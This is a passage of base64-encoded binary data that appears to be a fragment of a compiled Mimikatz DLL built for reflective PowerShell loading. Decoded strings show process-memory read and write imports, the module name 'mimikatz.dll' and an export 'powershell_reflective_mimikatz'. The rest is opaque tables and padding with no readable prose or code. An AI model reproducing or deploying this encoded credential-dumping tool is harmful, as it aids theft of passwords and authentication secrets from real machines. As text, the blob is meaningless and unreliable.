GV2aWNlSW9Db250cm9sACMDU2V0RmlsZVBvaW50ZXIAAI8DVmlydHVhbFF1ZXJ5AACQA1ZpcnR1YWxRdWVyeUV4AAC0AlJlYWRQcm9jZXNzTWVtb3J5AI4DVmlydHVhbFByb3RlY3RFeAAAtANXcml0ZVByb2Nlc3NNZW1vcnkAAGQCTWFwVmlld09mRmlsZQB4A1VubWFwVmlld09mRmlsZQBYAENyZWF0ZUZpbGVNYXBwaW5nVwAAWwJMb2NhbFJlQWxsb2MAAGwAQ3JlYXRlUHJvY2Vzc1cAAEsBR2V0RGF0ZUZvcm1hdFcAAOMBR2V0VGltZUZvcm1hdFcAAMcARmlsZVRpbWVUb0xvY2FsRmlsZVRpbWUAYgNTeXN0ZW1UaW1lVG9GaWxlVGltZQAAygFHZXRTeXN0ZW1UaW1lAPsARnJlZUxpYnJhcnkAUQJMb2FkTGlicmFyeVcAAKIBR2V0UHJvY0FkZHJlc3MAAPkCU2V0Q29uc29sZUN1cnNvclBvc2l0aW9uAAC7AUdldFN0ZEhhbmRsZQAAywBGaWxsQ29uc29sZU91dHB1dENoYXJhY3RlclcAOgFHZXRDb25zb2xlU2NyZWVuQnVmZmVySW5mbwAASAFHZXRDdXJyZW50VGhyZWFkAABGAUdldEN1cnJlbnRQcm9jZXNzSWQAS0VSTkVMMzIuZGxsAAAEBV92c2N3cHJpbnRmAFoFd2NzcmNocgBRBXdjc2NocgAABwVfd2NzaWNtcAAACQVfd2NzbmljbXAAXAV3Y3NzdHIAAF8Fd2NzdG91bAD2AF9lcnJubwAA4AR2ZndwcmludGYAJwRmZmx1c2gAALEDX3dmb3BlbgAkBGZjbG9zZQAAOgRmcmVlAAB0A193Y3NkdXAAbXN2Y3J0LmRsbAAAgARtZW1jcHkAAIQEbWVtc2V0AABTAF9fQ19zcGVjaWZpY19oYW5kbGVyAABSAF9YY3B0RmlsdGVyAHQEbWFsbG9jAABsAV9pbml0dGVybQCgAF9hbXNnX2V4aXQAABMEY2FsbG9jAABUBGlzZGlnaXQAfQRtYnRvd2MAAHsAX19tYl9jdXJfbWF4AABWBGlzbGVhZGJ5dGUAAGkEaXN4ZGlnaXQAAG0EbG9jYWxlY29udgAAbwFfaW9iAAC6Al9zbnByaW50ZgDGAV9pdG9hAAwFd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